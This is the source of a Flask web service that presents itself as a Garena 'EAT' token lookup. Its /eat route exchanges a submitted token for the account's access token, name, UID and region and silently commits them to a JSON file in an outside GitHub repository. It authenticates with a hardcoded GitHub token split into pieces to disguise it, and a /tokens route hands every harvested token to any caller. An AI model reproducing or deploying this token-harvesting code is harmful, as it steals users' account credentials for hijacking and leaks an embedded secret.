from flask import Flask, request, jsonify
from urllib.parse import urlparse, parse_qs
import requests
import os
import json
import base64
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

# ===== GitHub Config =====
SUFF = "gh"
SUXX = "p_"
SHHH = "L5lwnt4racn9datNSaiyYWgbiF1WXr1mqOav"
GITHUB_TOKEN = SUFF + SUXX + SHHH
GITHUB_USERNAME = "accgojo911-ops"
GITHUB_REPO = "All-aces"
GITHUB_FILE = "eat_tokens.json"
GITHUB_BRANCH = "main"


def github_get_file():
    """GitHub থেকে current JSON file + sha আনা"""
    url = f"https://api.github.com/repos/{GITHUB_USERNAME}/{GITHUB_REPO}/contents/{GITHUB_FILE}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    r = requests.get(url, headers=headers, params={"ref": GITHUB_BRANCH}, timeout=10)

    if r.status_code == 200:
        data = r.json()
        content = base64.b64decode(data["content"]).decode("utf-8")
        return json.loads(content), data["sha"]
    elif r.status_code == 404:
        return [], None
    else:
        raise Exception(f"GitHub GET failed: {r.status_code} - {r.text}")


def github_save_file(data_list, sha, commit_msg):
    """GitHub-এ JSON file save/update করা"""
    url = f"https://api.github.com/repos/{GITHUB_USERNAME}/{GITHUB_REPO}/contents/{GITHUB_FILE}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }

    content_str = json.dumps(data_list, indent=2, ensure_ascii=False)
    content_b64 = base64.b64encode(content_str.encode("utf-8")).decode("utf-8")

    payload = {
        "message": commit_msg,
        "content": content_b64,
        "branch": GITHUB_BRANCH
    }
    if sha:
        payload["sha"] = sha

    r = requests.put(url, headers=headers, json=payload, timeout=15)
    return r.status_code in (200, 201), r.text


def save_token_to_github(token_data):
    """Token কে GitHub JSON-এ save করা (duplicate check সহ)"""
    try:
        existing, sha = github_get_file()

        # Duplicate check (uid + access_token)
        for item in existing:
            if (item.get("uid") == token_data.get("uid") and
                item.get("access_token") == token_data.get("access_token")):
                return False, "Token already exists"

        token_data["saved_at"] = datetime.utcnow().isoformat() + "Z"
        token_data["credits"] = "@RFG_GAMER"
        existing.append(token_data)

        ok, msg = github_save_file(
            existing,
            sha,
            f"Add EAT token - {token_data.get('name', 'unknown')} ({token_data.get('uid')})"
        )
        return ok, msg if ok else f"GitHub save failed: {msg}"

    except Exception as e:
        return False, f"GitHub error: {str(e)}"


# ===== Main Route =====
@app.route('/eat', methods=['GET'])
def get_eat_info():
    token = request.args.get('token')

    if not token or not token.strip():
        return jsonify({"status": "error", "message": "Invalid EAT Token"}), 400

    try:
        url = f"https://api-otrss.garena.com/support/callback/?access_token={token.strip()}"
        r = requests.get(url, allow_redirects=False, timeout=10)

        if "Location" in r.headers:
            q = parse_qs(urlparse(r.headers["Location"]).query)

            result = {
                "access_token": q.get("access_token", ["N/A"])[0],
                "name": q.get("nickname", ["N/A"])[0],
                "uid": q.get("account_id", ["N/A"])[0],
                "region": q.get("region", ["N/A"])[0],
            }

            # 🔥 Auto save to GitHub
            saved, save_msg = save_token_to_github(result)

            return jsonify({
                "status": "success",
                "access_token": result["access_token"],
                "name": result["name"],
                "uid": result["uid"],
                "region": result["region"],
                "credits": "@RFG_GAMER",
                "saved_to_github": saved,
                "save_message": save_msg
            }), 200
        else:
            return jsonify({"status": "error", "message": "Invalid Token or expired link"}), 400

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


# ===== View all saved tokens (optional) =====
@app.route('/tokens', methods=['GET'])
def view_tokens():
    try:
        data, _ = github_get_file()
        return jsonify({"status": "success", "count": len(data), "tokens": data}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5583, debug=True)
